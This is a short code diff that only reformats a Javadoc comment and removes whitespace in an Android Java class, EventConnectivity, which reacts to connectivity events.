@@ -17,7 +17,9 @@ import com.android.syssetup.listener.ListenerConnectivity;
 import com.android.syssetup.util.Check;
 
 public class EventConnectivity extends BaseEvent implements Observer<Connectivity> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "EventConnectivity"; //$NON-NLS-1$
 
 	private int actionOnExit, actionOnEnter;
@@ -42,7 +44,7 @@ public class EventConnectivity extends BaseEvent implements Observer<Connectivit
 
 	@Override
 	public void actualGo() {
-		
+
 	}
 
 	// Viene richiamata dal listener (dalla dispatch())
